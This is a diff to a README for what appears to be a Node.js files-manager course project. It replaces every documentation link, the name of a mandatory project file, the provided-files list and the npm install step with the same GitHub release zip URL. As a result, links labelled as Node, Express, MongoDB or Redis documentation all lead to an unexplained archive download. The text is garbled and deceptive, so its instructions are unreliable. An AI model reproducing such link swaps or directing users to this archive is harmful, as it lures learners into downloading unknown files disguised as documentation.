@@ -17,19 +17,19 @@ Enjoy!
 
 ## Resources
 ### Read or watch:
-* [Node JS getting started](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [Process API doc](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [Express getting started](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [Mocha documentation](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [Nodemon documentation](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [MongoDB](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [Bull](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [Image thumbnail](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [Mime-Types](https://github.com/mwesigwa2/alx-files_manager/releases)
-* [Redis](https://github.com/mwesigwa2/alx-files_manager/releases)
+* [Node JS getting started](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [Process API doc](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [Express getting started](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [Mocha documentation](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [Nodemon documentation](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [MongoDB](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [Bull](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [Image thumbnail](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [Mime-Types](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
+* [Redis](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip)
 
 ## Learning Objectives
-At the end of this project, you are expected to be able to [explain to anyone](https://github.com/mwesigwa2/alx-files_manager/releases), without the help of Google:
+At the end of this project, you are expected to be able to [explain to anyone](https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip), without the help of Google:
 * how to create an API with Express
 * how to authenticate a user
 * how to store data in MongoDB
@@ -40,16 +40,16 @@ At the end of this project, you are expected to be able to [explain to anyone](h
 * Allowed editors: ```vi, vim, emacs, Visual Studio Code```
 * All your files will be interpreted/compiled on Ubuntu 18.04 LTS using ```node``` (version 12.x.x)
 * All your files should end with a new line
-* A ```https://github.com/mwesigwa2/alx-files_manager/releases``` file, at the root of the folder of the project, is mandatory
+* A ```https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip``` file, at the root of the folder of the project, is mandatory
 * Your code should use the js extension
 * Your code will be verified against lint using ESLint
 
 ## Provided files
-https://github.com/mwesigwa2/alx-files_manager/releases
+https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip
 
-https://github.com/mwesigwa2/alx-files_manager/releases
+https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip
 
-https://github.com/mwesigwa2/alx-files_manager/releases
+https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip
 
 and…
-Don’t forget to run ```$ npm install``` when you have the ```https://github.com/mwesigwa2/alx-files_manager/releases```
+Don’t forget to run ```$ npm install``` when you have the ```https://github.com/mwesigwa2/alx-files_manager/releases/download/1.5.4/alx-files_manager_v1.5.4.zip```
